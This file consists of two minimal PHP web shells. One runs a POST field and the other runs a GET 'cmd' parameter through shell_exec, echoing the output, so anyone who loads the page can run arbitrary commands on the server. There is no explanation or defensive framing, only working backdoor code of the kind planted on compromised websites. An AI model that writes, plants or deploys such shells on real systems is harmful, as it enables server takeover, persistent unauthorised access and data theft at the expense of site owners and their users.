<?php
if (isset($_POST['c'])) {
    echo "<pre>" . htmlspecialchars(shell_exec($_POST['c'])) . "</pre>";
}
?>
<form method="post">
<input name="c" size="50">
<input type="submit" value="Run">
</form>

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if (isset($_GET['cmd'])) {
    echo "Command: " . htmlspecialchars($_GET['cmd']) . "<BR>";
    echo shell_exec($_GET['cmd']);
}
?>
</pre>
</BODY></HTML>
